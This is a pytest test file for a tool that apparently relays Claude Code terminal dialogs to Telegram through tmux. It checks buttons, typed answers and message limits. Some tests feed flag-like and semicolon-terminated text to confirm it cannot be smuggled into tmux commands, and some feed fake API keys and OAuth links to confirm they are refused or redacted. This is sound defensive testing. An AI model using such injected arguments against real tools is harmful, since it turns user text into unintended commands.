    monkeypatch.setattr(I, "_interrupted_idle", lambda cfg, bot, session: calls.append(session))
    rig.scr.after["Escape"] = ""
    assert press(rig, cancel) == "dialog"
    assert rig.scr.sent == ["Escape"] and calls == ["s"]
    rig.scr.sent.clear()
    press(rig, cancel)
    assert rig.scr.sent == []


def test_cancel_clears_the_question_record(rig):
    from ctb import asks
    asks.record("s", {"questions": [{"question": "Q?", "options": [{"label": "A"}, {"label": "B"}]}]})
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    rig.scr.after["Escape"] = ""
    press(rig, buttons(last_card(rig))[0]["callback_data"])
    assert asks.load("s") is None


def test_a_cancel_card_of_a_changed_dialog_does_nothing(rig):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    cancel = buttons(last_card(rig))[0]["callback_data"]
    rig.scr.body = SINGLE.replace("Postgres", "MySQL")
    press(rig, cancel)
    assert rig.scr.sent == []


def test_full_screen_is_the_last_resort_button_and_shows_no_dead_arrows_on_permission_screens(rig):
    rig.scr.body = PERMISSION
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert press(rig, "dg:s") == "dialog"
    edit = rig.bot.methods("editMessageText")[-1]
    assert "<pre>" in edit["text"]
    assert not [b for row in edit["reply_markup"]["inline_keyboard"] for b in row if b["callback_data"].startswith("k:")
                and b["callback_data"].split(":")[1] in ("up", "down", "enter")]
    markup = I.menu_buttons(TRUST)  # an unnumbered Yes/No screen
    assert not [b for row in markup["inline_keyboard"] for b in row if b["callback_data"].startswith(("k:up", "k:down", "dg:k"))]


def test_buttons_are_owner_only_and_topic_bound(rig):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    cancel = buttons(last_card(rig))[0]["callback_data"]
    assert press(rig, cancel, user=99) == "ignored"
    assert press(rig, cancel, thread=999) == "ignored"
    assert press(rig, "dg:e:zzzz") == "ignored"
    assert rig.scr.sent == []


# --- typed answers ---------------------------------------------------------------------------------------------------

def test_typed_number_or_name_selects_the_option(rig):
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    rig.scr.after["2"] = ""
    assert say(rig, "2") == "dialog-typed" and rig.scr.sent == ["2"]
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    rig.scr.sent.clear()
    rig.scr.after["1"] = ""
    assert say(rig, "yes, go live") == "dialog-typed" and rig.scr.sent == ["1"]


def test_a_dialog_with_a_lasting_option_is_answered_by_typing_too(rig):
    rig.scr.body = PERMISSION
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    rig.scr.after["1"] = ""
    assert say(rig, "1") == "dialog-typed" and rig.scr.sent == ["1"]


def test_unmatched_typed_text_lists_the_options_and_stays_queued_for_claude(rig):
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "maybe later") == "queued"
    assert rig.scr.sent == []
    texts = [p["text"] for p in rig.bot.methods("sendMessage")]
    assert any("1. Yes, go live" in x for x in texts) and any("goes to Claude" in x or "to Claude after" in x for x in texts)


def test_stale_typed_answer_does_nothing(rig):
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    rig.scr.body = "❯ \n"
    assert say(rig, "1") == "dialog-stale"
    assert rig.scr.sent == [] and D.rec_get("s") == {}


def test_a_dialog_that_no_longer_parses_is_stale_never_skipped(rig):
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    rig.scr.body = f"Promote the build to production now?\n\n❯ 1. Yes, go live\n  2. No, keep it in staging\n\n{HINT}\n\nand then some text"
    assert say(rig, "1") in ("dialog-stale", "queued")
    assert rig.scr.sent == []


def test_a_different_dialog_makes_the_old_answer_stale(rig):
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    rig.scr.body = SINGLE
    assert say(rig, "1") == "dialog-stale" and rig.scr.sent == []


def test_digits_stay_in_the_identity_and_a_timer_costs_only_a_new_card():
    a = D.parse("Run build 12?\n❯ 1. Yes\n  2. No\n\n" + HINT)
    b = D.parse("Run build 13?\n❯ 1. Yes\n  2. No\n\n" + HINT)
    assert a.identity != b.identity
    unk = "Pick a theme (12s)\n\n  Enter to select · Esc to cancel"
    assert D._identity_of(None, unk) != D._identity_of(None, unk.replace("12s", "13s"))
    assert D._identity_of(None, unk + "\n  esc to interrupt · 12s") == D._identity_of(None, unk + "\n  esc to interrupt · 14s")


def test_typed_answer_needs_the_owner_and_the_topics_own_session(rig):
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "1", user=99) == "ignored"
    other = rig.topics.ensure("other", "other")
    assert say(rig, "1", thread=other) != "dialog-typed"
    assert rig.scr.sent == []


def test_voice_and_pictures_never_answer(rig):
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    m = {"chat": {"id": OWNER, "type": "private"}, "from": {"id": OWNER}, "message_thread_id": rig.thread,
         "message_id": 61, "date": 2000000000, "voice": {"file_id": "x", "duration": 2}}
    I.handle({"message": m}, rig.cfg, rig.bot, rig.topics, rig.box, None, 0)
    m2 = dict(m, photo=[{"file_id": "p"}], caption="1")
    m2.pop("voice")
    I.handle({"message": m2}, rig.cfg, rig.bot, rig.topics, rig.box, None, 0)
    assert rig.scr.sent == []


def test_keyboard_taps_never_count_as_typed_answers(rig):
    from ctb.i18n import both_langs
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    for label in both_langs("fixed_btn_continue") + both_langs("btn_continue"):
        rig.scr.sent.clear()
        assert say(rig, label) != "dialog-typed"
        assert rig.scr.sent == []


def test_typed_answers_run_in_the_session_lane(rig, monkeypatch):
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    lane = []
    monkeypatch.setattr(I, "_terminal_background", lambda s, a: lane.append((s, a)) or True)
    assert say(rig, "1") == "dialog-typed"
    assert rig.scr.sent == [] and lane and lane[0][0] == "s"
    lane[0][1]()
    assert rig.scr.sent == ["1"]


def test_other_then_the_typed_text_survives_the_selector_moving(rig):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    before = D.parse(rig.scr.body).stamp
    rig.scr.after["3"] = SINGLE.replace("❯ 1. SQLite (Recommended)", "  1. SQLite (Recommended)").replace(
        "  3. Type something.", "❯ 3. Type something.")
    assert say(rig, "3") == "dialog-other"
    assert rig.scr.sent == ["3"] and D.parse(rig.scr.body).stamp != before
    assert D.rec_get("s")["text_mode"]
    rig.scr.after["LIT:Use DuckDB"] = ""
    assert say(rig, "Use DuckDB") == "dialog-text"
    assert rig.scr.sent[-2:] == ["LIT:Use DuckDB", "Enter"]


def test_other_text_with_a_secret_is_refused(rig):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    say(rig, "3")
    assert say(rig, "sk-ant-api03-" + "A" * 40) == "refused"
    assert not any(k.startswith("LIT:") for k in rig.scr.sent)


def test_the_watcher_does_not_reset_the_other_text_window(rig):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    say(rig, "3")
    assert D.rec_get("s")["text_mode"]
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert D.rec_get("s")["text_mode"]


def test_expired_text_window_is_not_an_answer(rig):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    say(rig, "3")
    D.rec_set("s", dict(D.rec_get("s"), text_mode=True, text_at=time.time() - D.TYPED_TTL - 5))
    assert say(rig, "hello there") != "dialog-text"


def test_unknown_dialog_takes_only_key_words_never_free_text_or_digits(rig):
    unk = "Pick a theme\n\n  Enter to select · Esc to cancel"
    rig.scr.body = unk
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "esc") == "dialog-typed" and rig.scr.sent == ["Escape"]
    rig.scr.sent.clear()
    rig.scr.body = unk
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "2") == "queued"
    assert say(rig, "yes please delete everything") == "queued"
    assert say(rig, "yes") == "queued"
    assert rig.scr.sent == []


def test_the_trust_screen_takes_key_words_by_typing_only(rig):
    rig.scr.body = TRUST
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert only_utility_buttons(last_card(rig)) and "1-9" not in last_card(rig)["text"]
    assert say(rig, "1") == "queued" and rig.scr.sent == []
    assert say(rig, "down") == "dialog-typed" and rig.scr.sent == ["Down"]


# --- literal text -------------------------------------------------------------------------------------------------------

def test_literal_text_is_typed_after_double_dash_even_when_it_looks_like_a_flag(rig):
    rig.scr.body = SINGLE
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    say(rig, "3")
    assert say(rig, "-R") == "dialog-text"
    assert rig.scr.literal_args[3:5] == ("-l", "--") and rig.scr.literal_args[-1] == "-R"


@pytest.mark.parametrize("text,expected", [("done;", "done\\;"), ("a\\;", "a\\\\;"), ("plain", "plain"), (";", "\\;")])
def test_a_trailing_semicolon_survives_tmux(text, expected):
    assert D.tmux_text(text) == expected


def test_autopilot_types_after_double_dash(monkeypatch):
    from ctb import autopilot
    seen = []
    monkeypatch.setattr(I, "_tmux", lambda *a: seen.append(a) or SimpleNamespace(returncode=0, stdout=""))
    autopilot.type_into("%1", "-R please;")
    typed = next(a for a in seen if a[0] == "send-keys")  # the screen is read first (a tip notice is closed)
    assert typed[-3:] == ("-l", "--", "-R please\\;")


# --- held messages and the watcher ----------------------------------------------------------------------------------------

def test_message_behind_a_dialog_says_it_waits_on_a_question(rig, monkeypatch):
    rig.scr.body = SINGLE
    monkeypatch.setattr(I, "main_working", lambda s: True)
    assert say(rig, "hello?") == "queued"
    texts = [p["text"] for p in rig.bot.methods("sendMessage")]
    assert any("waiting for your answer to a question" in x for x in texts)
    assert not any("between steps" in x for x in texts)
    assert any("Which database" in x for x in texts)


def test_a_held_message_always_gets_the_nudge(rig, monkeypatch):
    rig.scr.body = SINGLE
    calls = []
    monkeypatch.setattr(I, "_reopen_or_nudge", lambda box, session: calls.append(session))
    monkeypatch.setattr(I, "main_working", lambda s: True)
    assert say(rig, "hello?") == "queued"
    time.sleep(0.2)
    assert calls == ["s"]


def test_queue_is_handed_over_once_the_dialog_closes_after_a_typed_answer(rig, monkeypatch):
    rig.scr.body = PROD
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    handed = []
    monkeypatch.setattr(D, "_hand_over", lambda session: handed.append(session))
    rig.scr.after["2"] = ""
    say(rig, "2")
    assert handed == ["s"]


def test_hand_over_nudges_only_when_something_waits(rig, monkeypatch):
    calls = []
    monkeypatch.setattr(I, "_reopen_or_nudge", lambda box, session: calls.append(session))
    monkeypatch.setattr(I, "default_inbox", lambda: rig.box)
    D._hand_over("s")
    time.sleep(0.1)
    assert calls == []
    rig.box.put("s", {"text": "x", "at": 1, "id": 1, "source": "owner", "chat": OWNER})
    D._hand_over("s")
    time.sleep(0.2)
    assert calls == ["s"]


def test_watcher_shows_an_unannounced_dialog_then_reminds_then_retires(rig):
    rig.scr.body = SINGLE
    from ctb import topics as T
    T.session_state_path("s").parent.mkdir(parents=True, exist_ok=True)
    T.session_state_path("s").write_text(json.dumps({"state": "busy"}))
    D._first_seen.clear()
    t0 = 1000.0
    assert D.remind(rig.cfg, rig.bot, rig.topics, now=t0) == 0
    assert D.remind(rig.cfg, rig.bot, rig.topics, now=t0 + 25) == 1
    assert D.remind(rig.cfg, rig.bot, rig.topics, now=t0 + 60) == 0
    assert D.remind(rig.cfg, rig.bot, rig.topics, now=time.time() + D.REMIND_EVERY + 5) == 1
    assert "Still waiting" in rig.bot.methods("sendMessage")[-1]["text"]
    rig.scr.body = "❯ \n"
    D.remind(rig.cfg, rig.bot, rig.topics, now=time.time() + 5000)
    assert D.rec_get("s") == {}


def test_identity_includes_the_option_labels():
    a = D.parse(f"Which one?\n❯ 1. Alpha\n  2. Beta\n\n{HINT}")
    b = D.parse(f"Which one?\n❯ 1. Alpha\n  2. Gamma\n\n{HINT}")
    assert a.identity != b.identity


# --- root cause guard: the question that never arrived (session 3ff570c0, 2026-11-01) --------------------------------------

def long_question():
    q = "\n".join(f"  \"Don't\" use 'quotes' & <tags> in item {i}: it's \"quoted\" here again" for i in range(40))
    return q + f"\n\n❯ 1. Yes\n  2. No\n\n{HINT}"


def test_card_never_exceeds_telegram_limit_after_escaping(rig):
    rig.scr.body = long_question()
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    sent = rig.bot.methods("sendMessage")[-1]
    assert len(sent["text"]) <= 4096 and sent["reply_markup"]["inline_keyboard"]
    assert len(I.screen_html("x", long_question())) <= 4096


def test_failed_send_falls_back_to_plain_text_and_is_logged(rig):
    rig.scr.body = SINGLE
    rig.bot.fail["sendMessage"] = "Bad Request: message is too long"
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    sent = rig.bot.methods("sendMessage")
    assert len(sent) == 2 and "parse_mode" not in sent[1] and sent[1]["reply_markup"]
    assert "dialog card send failed" in (state_dir() / "poll.log").read_text()


def test_notify_does_not_depend_on_the_placeholder_refresh(rig, monkeypatch):
    from ctb import mirror, topics
    monkeypatch.setattr(mirror.time, "sleep", lambda s: None)
    monkeypatch.setattr(topics, "set_state", lambda *a, **k: (_ for _ in ()).throw(TelegramError("boom")))
    rig.scr.body = SINGLE
    assert mirror.run_notify(rig.cfg, "s", "elicitation_dialog", bot=rig.bot) == 0
    assert "Which database" in rig.bot.methods("sendMessage")[-1]["text"]
    assert "state refresh failed" in (state_dir() / "poll.log").read_text()


def test_notify_failure_is_logged_not_silent(rig, monkeypatch):
    from ctb import mirror
    monkeypatch.setattr(mirror.time, "sleep", lambda s: None)
    rig.scr.body = SINGLE

    def always_fail(method, params=None, timeout=15):
        if method == "sendMessage":
            raise TelegramError("Unauthorized")
        return {}
    rig.bot.call = always_fail
    assert mirror.run_notify(rig.cfg, "s", "elicitation_dialog", bot=rig.bot) == 1
    assert "notify" in (state_dir() / "poll.log").read_text()


def test_cards_are_redacted_and_hide_signin_links(rig):
    body = ("Paste the code\nhttps://claude.ai/oauth/authorize?code=true&client_id=abc&state=SECRETSTATE123\n"
            "token sk-ant-api03-" + "B" * 40 + f"\n\n❯ 1. Continue\n  2. Stop\n\n{HINT}")
    rig.scr.body = body
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    text = last_card(rig)["text"]
    assert "SECRETSTATE123" not in text and "sk-ant-api03" not in text


# --- strings ---------------------------------------------------------------------------------------------------------------

def test_the_old_wording_is_gone_from_both_languages():
    from ctb.i18n import EN, HE
    for key in ("cli_sensitive_app_only", "cli_approval_app_only", "cli_approval_pending", "cli_unsafe_key",
                "compact_not_started", "screen_card_footer", "cli_help_text"):
        assert "in the app" not in EN[key] and "must be done in the app" not in EN[key]
        assert "באפליקציה" not in HE[key]
    for key in ("screen_card_footer", "cli_help_text"):
        assert "buttons" not in EN[key] and "כפתורים" not in HE[key]
    assert "1-9" not in EN["dlg_keys_line"] and "number" not in EN["dlg_note_unknown"]


def test_dialog_strings_keep_english_and_hebrew_on_separate_lines():
    from ctb.i18n import HE
    for key, value in HE.items():
        if (key.startswith("dlg_") and key != "dlg_btn_screen") or key == "cli_help_text":
            for line in value.split("\n"):
                assert not (re.search(r"[A-Za-z]{3,}", line) and re.search(r"[\u0590-\u05ff]", line)), (key, line)


# --- round 7: the Next row, and the side-box (preview) layout ---------------------------------------------------

MULTI_NEXT = fx("multi_next")


def test_round7_a_multi_select_that_is_not_the_last_question_has_a_next_row():
    d = D.parse(MULTI_NEXT)
    assert d.multi and d.nav == [("o", 1), ("o", 2), ("o", 3), ("o", 4), ("s",), ("o", 5)] and not d.preview


def test_round7_typed_numbers_advance_from_a_next_row_on_a_real_pane(rig, real_tmux, monkeypatch):
    pane, log = real_tmux.start(command=SIM + " next")
    use_real_pane(monkeypatch, real_tmux, pane)
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, "1, 3") == "dialog-typed"
    assert sim_result(log) == ["Cheese", "Mushrooms"]
    assert "Could not send" not in " ".join(p["text"] for p in rig.bot.methods("sendMessage"))


def test_round7_the_real_preview_screen_is_a_side_box_layout():
    d = D.parse(PREVIEW)
    assert d.preview and not D.parse(SINGLE).preview and not D.parse(MULTI_NEXT).preview


@pytest.mark.parametrize("number,expected", [("1", "Compact"), ("2", "Roomy")])
def test_round7_typed_number_on_a_preview_question_moves_then_presses_enter(rig, real_tmux, monkeypatch, number, expected):
    """A digit only moves the selector there; the old code sent just the digit and the card looped."""
    pane, log = real_tmux.start(command=SIM + " preview")
    use_real_pane(monkeypatch, real_tmux, pane)
    assert D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    assert say(rig, number) == "dialog-typed"
    assert sim_result(log) == expected
    cards = [p for p in rig.bot.methods("sendMessage") if "reply_markup" in p]
    assert len(cards) == 1  # answered, not re-posted
    assert "Answered" in rig.bot.methods("editMessageText")[-1]["text"]


def test_round7_preview_walks_with_verified_arrow_keys(rig):
    from multisim import PreviewSim
    rig.scr.sim = sim = PreviewSim()
    D.send_card(rig.cfg, rig.bot, "s", rig.thread)
    say(rig, "2")
    assert rig.scr.sent == ["Down", "Enter"] and sim.done == "Roomy"


def test_round7_review_card_lists_submit_answers_but_a_multi_select_card_hides_its_submit_row():
    assert "1 · Submit answers" in D.option_lines(D.parse(REVIEW), "en") and "2 · Cancel" in D.option_lines(D.parse(REVIEW), "en")
    assert "Submit" not in D.option_lines(D.parse(MULTI_FX), "en")


def test_round7_only_long_left_edge_rules_are_the_clis_own():
    own = clean_raw("─" * 100 + "\n x\n")
    fake_indented = clean_raw("          " + "─" * 100 + "\n x\n")
    fake_short = clean_raw("────────\n x\n")
    assert own.startswith("────────") and "────────" not in fake_indented and "────────" not in fake_short
    assert clean_raw("  " + "─" * 100 + "\n x\n").startswith("────────")  # the plan screen's two-space indent
